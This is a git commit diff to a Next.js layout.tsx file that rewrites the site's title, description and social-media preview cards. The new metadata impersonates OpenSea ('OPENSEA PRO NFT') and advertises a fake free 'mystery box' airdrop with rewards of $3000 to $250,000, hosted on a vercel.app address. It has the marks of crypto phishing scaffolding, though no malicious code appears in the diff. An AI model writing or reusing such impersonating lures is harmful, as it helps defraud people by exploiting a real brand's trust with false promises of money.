17629a03dddaf93f81c4dd1a097d0313b5d0ae40
Techie_Steve <tuwa.1simon@gmail.com>
2025-11-23 13:57:38 +0100

    Update layout.tsx

--- app/layout.tsx
+++ app/layout.tsx
@@ -4,8 +4,34 @@ import Script from 'next/script';
 import './globals.css';
 
 export const metadata: Metadata = {
-  title: 'OpenSea.io',
-  description: 'CLICK HERE TO CLAIM!'
+  metadataBase: new URL('https://spike-ten-zeta.vercel.app'),
+  title: 'CLICK HERE - OPENSEA PRO NFT',
+  description:
+    '🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\nTRY YOUR LUCK ! 🚀',
+  openGraph: {
+    title: 'CLICK HERE - OPENSEA PRO NFT',
+    description:
+      '🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\nTRY YOUR LUCK ! 🚀',
+    url: 'https://spike-ten-zeta.vercel.app/',
+    siteName: 'This is an automatically generated announcement message',
+    images: [
+      {
+        url: '/389-9bec97c22fa2e411.gif',
+        width: 512,
+        height: 512,
+        alt: 'OpenSea Pro Mystery Box Airdrop'
+      }
+    ],
+    type: 'website'
+  },
+  twitter: {
+    card: 'summary_large_image',
+    title: 'CLICK HERE - OPENSEA PRO NFT',
+    description:
+      '🟢 AIRDROP IS LIVE NOW 🟢\n\n🎉 Price: FREE\n🎉 Supply: 150 Mystery Box\n🎉 Reward: between $3000 and $250,000\n\nTRY YOUR LUCK ! 🚀',
+    images: ['/389-9bec97c22fa2e411.gif']
+  },
+  themeColor: '#7289DA'
 };
 
 export default function RootLayout(props: { children: ReactNode }) {
